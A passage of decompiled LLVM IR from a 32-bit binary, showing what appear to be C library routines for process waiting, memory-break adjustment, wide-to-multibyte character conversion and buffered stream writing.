dec_label_pc_8053aa4:                             ; preds = %dec_label_pc_8053a84
  %v1_8053aa4 = call i32 @function_8050568(i32 %v0_8053a84)
  %v0_8053aa9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053aa9 = sub i32 0, %v0_8053aa9
  %v2_8053aab = inttoptr i32 %v1_8053aa4 to i32*
  store i32 %v1_8053aa9, i32* %v2_8053aab, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053ab4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053ab0

dec_label_pc_8053ab0:                             ; preds = %dec_label_pc_8053a84, %dec_label_pc_8053aa4
  %v2_8053ab4 = phi i32 [ %v0_8053a84, %dec_label_pc_8053a84 ], [ %v2_8053ab4.pre, %dec_label_pc_8053aa4 ]
  %v0_8053ab0 = phi i32 [ %v3_8053a97, %dec_label_pc_8053a84 ], [ -1, %dec_label_pc_8053aa4 ]
  %v2_8053ab2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053ab2, i32* @edx, align 4
  store i32 %v2_8053ab4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053ab0

; uselistorder directives
  uselistorder i32 %v3_8053a97, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053ab0, { 1, 0 }
}

define i32 @function_8053aec(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053aec:
  %stack_var_-12 = alloca i32, align 4
  %v0_8053aed = load i32, i32* @ebx, align 4
  %v0_8053af1 = load i32, i32* @global_var_8063b44.385, align 4
  %v1_8053af1 = icmp eq i32 %v0_8053af1, 0
  %v1_8053afc = icmp eq i1 %v1_8053af1, false
  br i1 %v1_8053afc, label %dec_label_pc_8053b0f, label %dec_label_pc_8053afe

dec_label_pc_8053afe:                             ; preds = %dec_label_pc_8053aec
  %v1_8053b03 = call i32 @function_805527c(i32 0)
  %v2_8053b0b = icmp slt i32 %v1_8053b03, 0
  br i1 %v2_8053b0b, label %dec_label_pc_8053b31, label %dec_label_pc_8053afe.dec_label_pc_8053b0f_crit_edge

dec_label_pc_8053afe.dec_label_pc_8053b0f_crit_edge: ; preds = %dec_label_pc_8053afe
  %v0_8053b11.pre = load i32, i32* @global_var_8063b44.385, align 4
  br label %dec_label_pc_8053b0f

dec_label_pc_8053b0f:                             ; preds = %dec_label_pc_8053afe.dec_label_pc_8053b0f_crit_edge, %dec_label_pc_8053aec
  %v0_8053b1f = phi i32 [ %v0_8053b11.pre, %dec_label_pc_8053afe.dec_label_pc_8053b0f_crit_edge ], [ %v0_8053af1, %dec_label_pc_8053aec ]
  %v1_8053b0f = icmp eq i32 %arg1, 0
  %v1_8053b16 = icmp eq i1 %v1_8053b0f, false
  br i1 %v1_8053b16, label %dec_label_pc_8053b1c, label %dec_label_pc_8053b18

dec_label_pc_8053b18:                             ; preds = %dec_label_pc_8053b0f
  br label %dec_label_pc_8053b34

dec_label_pc_8053b1c:                             ; preds = %dec_label_pc_8053b0f
  store i32 %v0_8053b1f, i32* @ebx, align 4
  %v2_8053b21 = add i32 %v0_8053b1f, %arg1
  %v1_8053b25 = call i32 @function_805527c(i32 %v2_8053b21)
  %v2_8053b2d = icmp slt i32 %v1_8053b25, 0
  %v1_8053b2f = icmp eq i1 %v2_8053b2d, false
  br i1 %v1_8053b2f, label %dec_label_pc_8053b1c.dec_label_pc_8053b34_crit_edge, label %dec_label_pc_8053b31

dec_label_pc_8053b1c.dec_label_pc_8053b34_crit_edge: ; preds = %dec_label_pc_8053b1c
  %v0_8053b34.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053b34

dec_label_pc_8053b31:                             ; preds = %dec_label_pc_8053b1c, %dec_label_pc_8053afe
  br label %dec_label_pc_8053b34

dec_label_pc_8053b34:                             ; preds = %dec_label_pc_8053b1c.dec_label_pc_8053b34_crit_edge, %dec_label_pc_8053b18, %dec_label_pc_8053b31
  %v0_8053b34 = phi i32 [ %v0_8053b34.pre, %dec_label_pc_8053b1c.dec_label_pc_8053b34_crit_edge ], [ %v0_8053b1f, %dec_label_pc_8053b18 ], [ -1, %dec_label_pc_8053b31 ]
  %v2_8053b36 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053b36, i32* @edx, align 4
  store i32 %v0_8053aed, i32* @ebx, align 4
  ret i32 %v0_8053b34

; uselistorder directives
  uselistorder i32 %v0_8053b1f, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_805527c, { 1, 0 }
  uselistorder label %dec_label_pc_8053b34, { 2, 0, 1 }
}

define i32 @function_8053b3c(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4) local_unnamed_addr {
dec_label_pc_8053b3c:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8053b3d = load i32, i32* @esi, align 4
  store i32 %v0_8053b3d, i32* %stack_var_-8, align 4
  %v4_8053b4d = ptrtoint %rusage* %arg4 to i32
  store i32 %v4_8053b4d, i32* %esi.global-to-local, align 4
  %v0_8053b51 = load i32, i32* @ebx, align 4
  %v6_8053b59 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4)
  store i32 %v0_8053b51, i32* @ebx, align 4
  store i32 %v6_8053b59, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v6_8053b59, -4095
  br i1 %tmp12, label %dec_label_pc_8053b71, label %dec_label_pc_8053b65

dec_label_pc_8053b65:                             ; preds = %dec_label_pc_8053b3c
  %v1_8053b65 = call i32 @function_8050568(i32 %v0_8053b51)
  %v0_8053b6a = load i32, i32* %esi.global-to-local, align 4
  %v1_8053b6a = sub i32 0, %v0_8053b6a
  %v2_8053b6c = inttoptr i32 %v1_8053b65 to i32*
  store i32 %v1_8053b6a, i32* %v2_8053b6c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8053b74.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053b71

dec_label_pc_8053b71:                             ; preds = %dec_label_pc_8053b3c, %dec_label_pc_8053b65
  %v2_8053b74 = phi i32 [ %v0_8053b3d, %dec_label_pc_8053b3c ], [ %v2_8053b74.pre, %dec_label_pc_8053b65 ]
  %v0_8053b71 = phi i32 [ %v6_8053b59, %dec_label_pc_8053b3c ], [ -1, %dec_label_pc_8053b65 ]
  store i32 %v2_8053b74, i32* @esi, align 4
  ret i32 %v0_8053b71

; uselistorder directives
  uselistorder i32 %v6_8053b59, { 1, 0, 2 }
  uselistorder i32 %v0_8053b51, { 1, 0 }
  uselistorder label %dec_label_pc_8053b71, { 1, 0 }
}

define i32 @function_8053b78() local_unnamed_addr {
dec_label_pc_8053b78:
  ret i32 ptrtoint (i32* @global_var_8063b24.386 to i32)
}

define i32 @function_8053b80() local_unnamed_addr {
dec_label_pc_8053b80:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8053b8b = icmp eq i32 %tmp5, 0
  %v1_8053b8d = icmp eq i1 %v1_8053b8b, false
  br i1 %v1_8053b8d, label %dec_label_pc_8053b95, label %dec_label_pc_8053b8f

dec_label_pc_8053b8f:                             ; preds = %dec_label_pc_8053b80
  %v2_8053b8f = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8053b95

dec_label_pc_8053b95:                             ; preds = %dec_label_pc_8053b80, %dec_label_pc_8053b8f
  %v0_8053bb1 = phi i32 [ %tmp5, %dec_label_pc_8053b80 ], [ %v2_8053b8f, %dec_label_pc_8053b8f ]
  %v0_8053b99 = phi i32 [ %tmp4, %dec_label_pc_8053b80 ], [ 0, %dec_label_pc_8053b8f ]
  %v2_8053b95 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_8053b99, i32* %stack_var_-4, align 4
  store i32 %v2_8053b95, i32* %stack_var_-8, align 4
  %v2_8053bac = ptrtoint i32* %stack_var_-8 to i32
  %v5_8053bb2 = inttoptr i32 %v0_8053bb1 to i8*
  %v6_8053bb2 = call i32 @function_8053be4(i8* %v5_8053bb2, i32 %v2_8053bac, i32 1, i32 16, i32 %tmp)
  %v1_8053bba = icmp eq i32 %v6_8053bb2, 0
  %v1_8053bbc = icmp eq i1 %v1_8053bba, false
  br i1 %v1_8053bbc, label %dec_label_pc_8053bc0, label %dec_label_pc_8053bbe

dec_label_pc_8053bbe:                             ; preds = %dec_label_pc_8053b95
  %v1_8053bbe = and i32 %v6_8053bb2, -256
  %v2_8053bbe = or i32 %v1_8053bbe, 1
  br label %dec_label_pc_8053bc0

dec_label_pc_8053bc0:                             ; preds = %dec_label_pc_8053b95, %dec_label_pc_8053bbe
  %v0_8053bc3 = phi i32 [ %v6_8053bb2, %dec_label_pc_8053b95 ], [ %v2_8053bbe, %dec_label_pc_8053bbe ]
  ret i32 %v0_8053bc3

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8053bc0, { 1, 0 }
  uselistorder label %dec_label_pc_8053b95, { 1, 0 }
}

define i32 @function_8053bc4() local_unnamed_addr {
dec_label_pc_8053bc4:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8053bd9 = inttoptr i32 %tmp to i8*
  %v6_8053bd9 = call i32 @function_8053be4(i8* %v5_8053bd9, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8053bd9
}

define i32 @function_8053be4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8053be4:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053be7 = load i32, i32* @ebx, align 4
  %v4_8053beb = ptrtoint i8* %arg1 to i32
  store i32 %v4_8053beb, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_8053bf7 = icmp eq i8* %arg1, null
  br i1 %v1_8053bf7, label %dec_label_pc_8053c2b.thread, label %dec_label_pc_8053bfb

dec_label_pc_8053bfb:                             ; preds = %dec_label_pc_8053be4
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_8053c00 = icmp eq i32 %v4_8053beb, %arg2
  %v1_8053c02 = icmp eq i1 %v12_8053c00, false
  br i1 %v1_8053c02, label %dec_label_pc_8053c2b, label %dec_label_pc_8053c25

dec_label_pc_8053c2b.thread:                      ; preds = %dec_label_pc_8053be4
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8053c08 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053c08, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c35

dec_label_pc_8053c11:                             ; preds = %dec_label_pc_8053c3c
  %v1_8053c11 = call i32 @function_8050568(i32 %v0_8053be7)
  store i32 %v1_8053c11, i32* %eax.global-to-local, align 4
  %v1_8053c16 = inttoptr i32 %v1_8053c11 to i32*
  store i32 84, i32* %v1_8053c16, align 4
  br label %dec_label_pc_8053c62

dec_label_pc_8053c21:                             ; preds = %dec_label_pc_8053c43
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8053c57.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053c53

dec_label_pc_8053c25:                             ; preds = %dec_label_pc_8053bfb
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8053c27 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053c27, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053c2b

dec_label_pc_8053c2b:                             ; preds = %dec_label_pc_8053bfb, %dec_label_pc_8053c25
  %v2_8053c4315 = phi i32 [ %v4_8053beb, %dec_label_pc_8053bfb ], [ %v2_8053c27, %dec_label_pc_8053c25 ]
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %tmp32 = icmp ult i32 %arg4, %arg3
  br i1 %tmp32, label %dec_label_pc_8053c33, label %dec_label_pc_8053c35

dec_label_pc_8053c33:                             ; preds = %dec_label_pc_8053c2b
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c35

dec_label_pc_8053c35:                             ; preds = %dec_label_pc_8053c2b.thread, %dec_label_pc_8053c2b, %dec_label_pc_8053c33
  %v2_8053c431531 = phi i32 [ %v2_8053c4315, %dec_label_pc_8053c2b ], [ %v2_8053c4315, %dec_label_pc_8053c33 ], [ %v2_8053c08, %dec_label_pc_8053c2b.thread ]
  %v0_8053c38 = phi i32 [ %arg3, %dec_label_pc_8053c2b ], [ %arg4, %dec_label_pc_8053c33 ], [ %arg3, %dec_label_pc_8053c2b.thread ]
  %v1_8053c35 = inttoptr i32 %arg2 to i32*
  %v2_8053c35 = load i32, i32* %v1_8053c35, align 4
  store i32 %v2_8053c35, i32* %esi.global-to-local, align 4
  store i32 %v0_8053c38, i32* @ecx, align 4
  %v1_8053c4f3 = icmp eq i32 %v0_8053c38, 0
  %v1_8053c5110 = icmp eq i1 %v1_8053c4f3, false
  br i1 %v1_8053c5110, label %dec_label_pc_8053c3c, label %dec_label_pc_8053c53

dec_label_pc_8053c3c:                             ; preds = %dec_label_pc_8053c35, %dec_label_pc_8053c49
  %v2_8053c43 = phi i32 [ %v2_8053c4c, %dec_label_pc_8053c49 ], [ %v2_8053c431531, %dec_label_pc_8053c35 ]
  %v0_8053c3c = phi i32 [ %v1_8053c49, %dec_label_pc_8053c49 ], [ %v2_8053c35, %dec_label_pc_8053c35 ]
  %v1_8053c3c = inttoptr i32 %v0_8053c3c to i32*
  %v2_8053c3c = load i32, i32* %v1_8053c3c, align 4
  store i32 %v2_8053c3c, i32* %eax.global-to-local, align 4
  %v6_8053c41 = icmp ugt i32 %v2_8053c3c, 127
  br i1 %v6_8053c41, label %dec_label_pc_8053c11, label %dec_label_pc_8053c43

dec_label_pc_8053c43:                             ; preds = %dec_label_pc_8053c3c
  %v1_8053c43 = trunc i32 %v2_8053c3c to i8
  %v3_8053c43 = inttoptr i32 %v2_8053c43 to i8*
  store i8 %v1_8053c43, i8* %v3_8053c43, align 1
  %v0_8053c45 = load i32, i32* %eax.global-to-local, align 4
  %v3_8053c45 = trunc i32 %v0_8053c45 to i8
  %v4_8053c45 = icmp eq i8 %v3_8053c45, 0
  br i1 %v4_8053c45, label %dec_label_pc_8053c21, label %dec_label_pc_8053c49

dec_label_pc_8053c49:                             ; preds = %dec_label_pc_8053c43
  %v0_8053c49 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053c49 = add i32 %v0_8053c49, 4
  store i32 %v1_8053c49, i32* %esi.global-to-local, align 4
  %v0_8053c4c = load i32, i32* %edx.global-to-local, align 4
  %v1_8053c4c = load i32, i32* %edi.global-to-local, align 4
  %v2_8053c4c = add i32 %v1_8053c4c, %v0_8053c4c
  store i32 %v2_8053c4c, i32* %edx.global-to-local, align 4
  %v0_8053c4e = load i32, i32* @ecx, align 4
  %v1_8053c4e = add i32 %v0_8053c4e, -1
  %v8_8053c4e = icmp eq i32 %v1_8053c4e, 0
  store i32 %v1_8053c4e, i32* @ecx, align 4
  %v1_8053c51 = icmp eq i1 %v8_8053c4e, false
  br i1 %v1_8053c51, label %dec_label_pc_8053c3c, label %dec_label_pc_8053c53

dec_label_pc_8053c53:                             ; preds = %dec_label_pc_8053c49, %dec_label_pc_8053c35, %dec_label_pc_8053c21
  %v0_8053c5b = phi i32 [ 0, %dec_label_pc_8053c21 ], [ %v2_8053c35, %dec_label_pc_8053c35 ], [ %v1_8053c49, %dec_label_pc_8053c49 ]
  %v0_8053c57 = phi i32 [ %v0_8053c57.pre, %dec_label_pc_8053c21 ], [ %v2_8053c431531, %dec_label_pc_8053c35 ], [ %v2_8053c4c, %dec_label_pc_8053c49 ]
  %v2_8053c53 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053c53, i32* %eax.global-to-local, align 4
  %v12_8053c57 = icmp eq i32 %v0_8053c57, %v2_8053c53
  br i1 %v12_8053c57, label %dec_label_pc_8053c5e, label %dec_label_pc_8053c5b

dec_label_pc_8053c5b:                             ; preds = %dec_label_pc_8053c53
  %v1_8053c5b = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053c5b = inttoptr i32 %v1_8053c5b to i32*
  store i32 %v0_8053c5b, i32* %v2_8053c5b, align 4
  br label %dec_label_pc_8053c5e

dec_label_pc_8053c5e:                             ; preds = %dec_label_pc_8053c53, %dec_label_pc_8053c5b
  %v0_8053c5e = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053c5e, i32* %eax.global-to-local, align 4
  %v1_8053c60 = load i32, i32* @ecx, align 4
  %v2_8053c60 = sub i32 %v0_8053c5e, %v1_8053c60
  br label %dec_label_pc_8053c62

dec_label_pc_8053c62:                             ; preds = %dec_label_pc_8053c11, %dec_label_pc_8053c5e
  %storemerge1 = phi i32 [ -1, %dec_label_pc_8053c11 ], [ %v2_8053c60, %dec_label_pc_8053c5e ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_8053be7, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_8053c4c, { 0, 2, 1 }
  uselistorder i32 %v1_8053c49, { 0, 2, 1 }
  uselistorder i32 %v2_8053c35, { 1, 0, 2 }
  uselistorder i32 %v0_8053c38, { 1, 0 }
  uselistorder i32 %v2_8053c431531, { 1, 0 }
  uselistorder i32 %v4_8053beb, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 2, 1, 5, 3, 6, 0, 4 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053c62, { 1, 0 }
  uselistorder label %dec_label_pc_8053c5e, { 1, 0 }
  uselistorder label %dec_label_pc_8053c3c, { 1, 0 }
  uselistorder label %dec_label_pc_8053c35, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053c2b, { 1, 0 }
}

define i32 @function_8053c6c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8053c6c:
  %stack_var_12 = alloca i32, align 4
  %v2_8053c6f = ptrtoint i32* %stack_var_12 to i32
  %v0_8053c77 = load i32, i32* @edx, align 4
  %v4_8053c81 = inttoptr i32 %arg1 to i16*
  %v5_8053c81 = call i32 @function_80545cc(i16* %v4_8053c81, i32 %arg2, i32 %v2_8053c6f, i32 %v0_8053c77)
  ret i32 %v5_8053c81
}

define i32 @function_8053c8c(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053c8c:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8053c8d = load i32, i32* @edi, align 4
  %v0_8053c8f = load i32, i32* @ebx, align 4
  %v4_8053c93 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8053c93, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_8053c9f4 = icmp eq i32 %arg3, 0
  br i1 %v1_8053c9f4, label %dec_label_pc_8053cfe, label %dec_label_pc_8053ca4.lr.ph

dec_label_pc_8053ca4.lr.ph:                       ; preds = %dec_label_pc_8053c8c
  br label %dec_label_pc_8053ca4

dec_label_pc_8053ca4:                             ; preds = %dec_label_pc_8053cc3.dec_label_pc_8053ca4_crit_edge, %dec_label_pc_8053ca4.lr.ph
  %v0_8053cb4 = phi i32 [ %v4_8053c93, %dec_label_pc_8053ca4.lr.ph ], [ %v0_8053cb4.pre, %dec_label_pc_8053cc3.dec_label_pc_8053ca4_crit_edge ]
  %v0_8053cb3 = phi i32 [ %arg2, %dec_label_pc_8053ca4.lr.ph ], [ %v2_8053cc5, %dec_label_pc_8053cc3.dec_label_pc_8053ca4_crit_edge ]
  %v0_8053ca6.in = phi i32 [ %arg3, %dec_label_pc_8053ca4.lr.ph ], [ %v2_8053cc3, %dec_label_pc_8053cc3.dec_label_pc_8053ca4_crit_edge ]
  %v0_8053ca6 = icmp slt i32 %v0_8053ca6.in, 0
  store i32 %v0_8053ca6.in, i32* %ebp.global-to-local, align 4
  %v2_8053ca6 = icmp eq i1 %v0_8053ca6, false
  %storemerge = select i1 %v2_8053ca6, i32 %v0_8053ca6.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8053cb4 = add i32 %v0_8053cb4, 4
  %v2_8053cb4 = inttoptr i32 %v1_8053cb4 to i32*
  %v3_8053cb4 = load i32, i32* %v2_8053cb4, align 4
  %tmp36 = inttoptr i32 %v0_8053cb3 to i32*
  %v5_8053cb7 = call i32 @function_80504fc(i32 %v3_8053cb4, i32* %tmp36, i32 %storemerge)
  store i32 %v5_8053cb7, i32* %eax.global-to-local, align 4
  %v2_8053cbf = icmp slt i32 %v5_8053cb7, 0
  br i1 %v2_8053cbf, label %dec_label_pc_8053cc9, label %dec_label_pc_8053cc3

dec_label_pc_8053cc3:                             ; preds = %dec_label_pc_8053ca4
  %v0_8053cc3 = load i32, i32* @ebx, align 4
  %v2_8053cc3 = sub i32 %v0_8053cc3, %v5_8053cb7
  %v12_8053cc3 = icmp eq i32 %v2_8053cc3, 0
  store i32 %v2_8053cc3, i32* @ebx, align 4
  %v0_8053cc5 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053cc5 = add i32 %v0_8053cc5, %v5_8053cb7
  store i32 %v2_8053cc5, i32* %esi.global-to-local, align 4
  br i1 %v12_8053cc3, label %dec_label_pc_8053cfe, label %dec_label_pc_8053cc3.dec_label_pc_8053ca4_crit_edge

dec_label_pc_8053cc3.dec_label_pc_8053ca4_crit_edge: ; preds = %dec_label_pc_8053cc3
  %v0_8053cb4.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053ca4

dec_label_pc_8053cc9:                             ; preds = %dec_label_pc_8053ca4
  %v0_8053cc9 = load i32, i32* @edi, align 4
  %v1_8053cc9 = add i32 %v0_8053cc9, 8
  %v2_8053cc9 = inttoptr i32 %v1_8053cc9 to i32*
  %v3_8053cc9 = load i32, i32* %v2_8053cc9, align 4
  store i32 %v3_8053cc9, i32* @edx, align 4
  %v1_8053ccc = add i32 %v0_8053cc9, 12
  %v2_8053ccc = inttoptr i32 %v1_8053ccc to i32*
  %v3_8053ccc = load i32, i32* %v2_8053ccc, align 4
  store i32 %v3_8053ccc, i32* %eax.global-to-local, align 4
  %v1_8053ccf = inttoptr i32 %v0_8053cc9 to i16*
  %v2_8053ccf = load i16, i16* %v1_8053ccf, align 2
  %v3_8053ccf = or i16 %v2_8053ccf, 8
  store i16 %v3_8053ccf, i16* %v1_8053ccf, align 2
  %v0_8053cd3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053cd3 = load i32, i32* @edx, align 4
  %v2_8053cd3 = sub i32 %v0_8053cd3, %v1_8053cd3
  %v12_8053cd3 = icmp eq i32 %v2_8053cd3, 0
  store i32 %v2_8053cd3, i32* %eax.global-to-local, align 4
  %v4_8053cfa.pre = load i32, i32* @ebx, align 4
  br i1 %v12_8053cd3, label %dec_label_pc_8053cfa, label %dec_label_pc_8053cd7

dec_label_pc_8053cd7:                             ; preds = %dec_label_pc_8053cc9
  %v6_8053cd9 = icmp ugt i32 %v2_8053cd3, %v4_8053cfa.pre
  br i1 %v6_8053cd9, label %dec_label_pc_8053cdd.preheader, label %dec_label_pc_8053cdb

dec_label_pc_8053cdb:                             ; preds = %dec_label_pc_8053cd7
  store i32 %v2_8053cd3, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8053cdd.preheader

dec_label_pc_8053cdd.preheader:                   ; preds = %dec_label_pc_8053cdb, %dec_label_pc_8053cd7
  %v0_8053cdd.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053cdd

dec_label_pc_8053cdd:                             ; preds = %dec_label_pc_8053cdd.preheader, %dec_label_pc_8053cef
  %v2_8053cdf = phi i32 [ %v1_8053cd3, %dec_label_pc_8053cdd.preheader ], [ %v1_8053ceb, %dec_label_pc_8053cef ]
  %v4_8053cdd = phi i32 [ %v2_8053cd3, %dec_label_pc_8053cdd.preheader ], [ %v0_8053ce1, %dec_label_pc_8053cef ]
  %v0_8053cdd = phi i32 [ %v0_8053cdd.pre, %dec_label_pc_8053cdd.preheader ], [ %v1_8053cef, %dec_label_pc_8053cef ]
  %v1_8053cdd = inttoptr i32 %v0_8053cdd to i8*
  %v2_8053cdd = load i8, i8* %v1_8053cdd, align 1
  %v3_8053cdd = zext i8 %v2_8053cdd to i32
  %v5_8053cdd = and i32 %v4_8053cdd, -256
  %v6_8053cdd = or i32 %v3_8053cdd, %v5_8053cdd
  store i32 %v6_8053cdd, i32* %eax.global-to-local, align 4
  %v3_8053cdf = inttoptr i32 %v2_8053cdf to i8*
  store i8 %v2_8053cdd, i8* %v3_8053cdf, align 1
  %v0_8053ce1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053ce1 = trunc i32 %v0_8053ce1 to i8
  %v10_8053ce1 = icmp eq i8 %v1_8053ce1, 10
  %v1_8053ce3 = icmp eq i1 %v10_8053ce1, false
  br i1 %v1_8053ce3, label %dec_label_pc_8053ceb, label %dec_label_pc_8053ce5

dec_label_pc_8053ce5:                             ; preds = %dec_label_pc_8053cdd
  %v0_8053ce5 = load i32, i32* @edi, align 4
  %v1_8053ce5 = add i32 %v0_8053ce5, 1
  %v2_8053ce5 = inttoptr i32 %v1_8053ce5 to i8*
  %v3_8053ce5 = load i8, i8* %v2_8053ce5, align 1
  %v4_8053ce5 = urem i8 %v3_8053ce5, 2
  %v5_8053ce5 = icmp eq i8 %v4_8053ce5, 0
  %v1_8053ce9 = icmp eq i1 %v5_8053ce5, false
  br i1 %v1_8053ce9, label %dec_label_pc_8053ce5.dec_label_pc_8053cf2_crit_edge, label %dec_label_pc_8053ceb

dec_label_pc_8053ce5.dec_label_pc_8053cf2_crit_edge: ; preds = %dec_label_pc_8053ce5
  %v0_8053cf2.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053cf2

dec_label_pc_8053ceb:                             ; preds = %dec_label_pc_8053ce5, %dec_label_pc_8053cdd
  %v0_8053ceb = load i32, i32* @edx, align 4
  %v1_8053ceb = add i32 %v0_8053ceb, 1
  store i32 %v1_8053ceb, i32* @edx, align 4
  %v0_8053cec = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053cec = add i32 %v0_8053cec, -1
  %v8_8053cec = icmp eq i32 %v1_8053cec, 0
  store i32 %v1_8053cec, i32* %ebp.global-to-local, align 4
  br i1 %v8_8053cec, label %dec_label_pc_8053ceb.dec_label_pc_8053cf2_crit_edge, label %dec_label_pc_8053cef

dec_label_pc_8053ceb.dec_label_pc_8053cf2_crit_edge: ; preds = %dec_label_pc_8053ceb
  %v1_8053cf2.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053cf2

dec_label_pc_8053cef:                             ; preds = %dec_label_pc_8053ceb
  %v0_8053cef = load i32, i32* %esi.global-to-local, align 4
  %v1_8053cef = add i32 %v0_8053cef, 1
  store i32 %v1_8053cef, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053cdd

dec_label_pc_8053cf2:                             ; preds = %dec_label_pc_8053ceb.dec_label_pc_8053cf2_crit_edge, %dec_label_pc_8053ce5.dec_label_pc_8053cf2_crit_edge
  %v1_8053cf2 = phi i32 [ %v0_8053ce5, %dec_label_pc_8053ce5.dec_label_pc_8053cf2_crit_edge ], [ %v1_8053cf2.pre, %dec_label_pc_8053ceb.dec_label_pc_8053cf2_crit_edge ]
  %v0_8053cf2 = phi i32 [ %v0_8053cf2.pre, %dec_label_pc_8053ce5.dec_label_pc_8053cf2_crit_edge ], [ %v1_8053ceb, %dec_label_pc_8053ceb.dec_label_pc_8053cf2_crit_edge ]
  %v2_8053cf2 = add i32 %v1_8053cf2, 16
  %v3_8053cf2 = inttoptr i32 %v2_8053cf2 to i32*
  store i32 %v0_8053cf2, i32* %v3_8053cf2, align 4
  %v0_8053cf5 = load i32, i32* @edx, align 4
  %v1_8053cf5 = load i32, i32* @edi, align 4
  %v2_8053cf5 = add i32 %v1_8053cf5, 8
  %v3_8053cf5 = inttoptr i32 %v2_8053cf5 to i32*
  %v4_8053cf5 = load i32, i32* %v3_8053cf5, align 4
  %v5_8053cf5 = sub i32 %v0_8053cf5, %v4_8053cf5
  store i32 %v5_8053cf5, i32* @edx, align 4
  %v0_8053cf8 = load i32, i32* @ebx, align 4
  %v2_8053cf8 = sub i32 %v0_8053cf8, %v5_8053cf5
  br label %dec_label_pc_8053cfa

